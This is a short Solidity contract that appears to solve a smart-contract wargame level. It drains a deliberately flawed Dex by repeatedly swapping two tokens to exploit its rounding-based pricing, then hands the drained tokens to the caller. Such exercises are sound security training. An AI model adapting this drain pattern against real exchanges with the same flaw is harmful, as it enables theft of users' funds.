// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Dex, SwappableToken } from "./Level22.sol";

contract L22Attack {
    Dex instance;

    constructor(Dex _instance) {
        instance = _instance;
    }

    function attack() external {
        SwappableToken token1 = SwappableToken(instance.token1());
        SwappableToken token2 = SwappableToken(instance.token2());
        token1.transferFrom(msg.sender, address(this), token1.balanceOf(msg.sender));
        token2.transferFrom(msg.sender, address(this), token2.balanceOf(msg.sender));
        instance.approve(address(instance), type(uint256).max);
        instance.swap(address(token1), address(token2), token1.balanceOf(address(this)));
        while (token1.balanceOf(address(instance)) > 0 && token2.balanceOf(address(instance)) > 0) {
            (SwappableToken from, SwappableToken to) =
                token1.balanceOf(address(this)) == 0 ? (token2, token1) : (token1, token2);
            uint256 amount = from.balanceOf(address(instance)) < from.balanceOf(address(this))
                ? from.balanceOf(address(instance))
                : from.balanceOf(address(this));
            instance.swap(address(from), address(to), amount);
        }
        token1.transfer(msg.sender, token1.balanceOf(address(this)));
        token2.transfer(msg.sender, token2.balanceOf(address(this)));
    }
}
